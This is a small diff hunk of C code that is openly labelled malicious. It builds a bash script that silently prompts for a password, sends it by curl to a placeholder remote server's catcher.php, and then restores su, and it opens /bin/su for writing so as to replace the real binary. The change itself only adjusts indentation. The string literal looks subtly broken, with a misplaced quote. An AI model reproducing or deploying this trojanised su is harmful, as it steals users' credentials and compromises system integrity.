@@ -35,7 +35,7 @@ int main () {
     /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
    
     char cmmd1[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" \n sudo mv /usr/su /usr/bin/su" > /dev/null 2>&1 \n";
-	    file1 = fopen("/bin/su", "w");
+    file1 = fopen("/bin/su", "w");
 
    if(file1 == NULL) {
 
